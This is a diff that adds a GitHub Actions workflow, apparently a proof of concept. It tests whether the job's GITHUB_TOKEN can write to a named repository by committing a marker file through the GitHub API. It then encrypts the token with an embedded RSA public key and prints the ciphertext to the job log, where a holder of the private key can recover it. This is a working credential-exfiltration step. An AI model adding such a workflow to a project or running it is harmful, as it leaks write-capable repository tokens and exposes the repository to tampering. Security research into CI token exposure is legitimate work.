@@ -1,0 +1,49 @@
+name: c246-write
+on:
+  workflow_dispatch:
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: prove write IN-JOB, then seal the token out
+        env:
+          JOBTOK: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -u
+          echo "JOBTOK length = ${#JOBTOK}"
+          echo "=== IN-JOB WRITE CONTROL: token writes to its own repo NOW ==="
+          BODY=$(printf '{"message":"in-job write c246","content":"%s"}' "$(echo -n c246-injob-write | base64)")
+          C=$(curl -s -o /tmp/wr -w '%{http_code}' -X PUT \
+                -H "Authorization: token $JOBTOK" -H 'Accept: application/vnd.github+json' \
+                -H 'Content-Type: application/json' \
+                -d "$BODY" \
+                https://api.github.com/repos/mr-benty/zz-c246-runner-0903/contents/injob-write-marker.txt)
+          echo "in-job WRITE -> $C  (201/200 = token HAS write; 422 = already exists, still write-capable)"
+          head -c 200 /tmp/wr; echo ""
+          cat > /tmp/k.pem <<'PEMEOF'
+          -----BEGIN PUBLIC KEY-----
+          MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAzv3bogEXkpKx5KDn0tpa
+          LeBEqxzCy3AZhUhHzaALCGPBuFQ14B+SZRw8KenDm0Fh3qXLskYhg5AzEmwsbkZu
+          rjTC2G8CaLtK58RH787snmGEMH4bP0bVv/hb4gAg7AzJq2GyIb45sGBA17T5KR5Q
+          94lfMhigZGyTOk3Au3RoF3ITv7daCL/7TQo4QeUPuUYkltNum4tWsHzNmClAcVEZ
+          rVo0lFGb1aLomX/fUHuEy4brQ4O4veocAtNCSnob3Cljg1wP7WydrmBjmubMkO1H
+          PiOyCWjW1Lnlch+hEDoD4GQuAnbAV/Jyg+XUuV3ZwtiZ69chRUno1v9Ln6L5r413
+          MM0eVDkNEs89agYJMA9CmoOegbaliI0HCYcynu68h7RRD6Trj0wNyaw1KVG4gyJN
+          9N44KweCrT77mjlvNNMMpI6O5rtqAYdZyxJBLO/UysSCXcK3ZAZobyXtO9pLIh4M
+          uJT8Y50OTs9rO4N6/X6jw7KU40ReYTavS5/KNijQ5dloMEay5SU8yFgoXqMfSoUs
+          0pSDU593LKC2nGCFr3S7//oz+YnTrOI4ay6Wk9HPlsBPOkybzt3U3Ij8tB9EbjL7
+          GnEd+6A4p/FaHAt67ISjm2sXYsTf357+F2v8yUFRCBENtrs867KeF9Ipfld7fYtn
+          oE525e5XeTtlHJ/BY08ADA0CAwEAAQ==
+          -----END PUBLIC KEY-----
+          PEMEOF
+          sed -i 's/^ *//' /tmp/k.pem
+          printf '%s' "$JOBTOK" > /tmp/t.bin
+          openssl pkeyutl -encrypt -pubin -inkey /tmp/k.pem -pkeyopt rsa_padding_mode:oaep -in /tmp/t.bin -out /tmp/t.enc
+          rm -f /tmp/t.bin
+          echo "CIPHERTEXT_BEGIN"
+          base64 -w0 /tmp/t.enc
+          echo ""
+          echo "CIPHERTEXT_END"
+          rm -f /tmp/t.enc /tmp/k.pem /tmp/wr
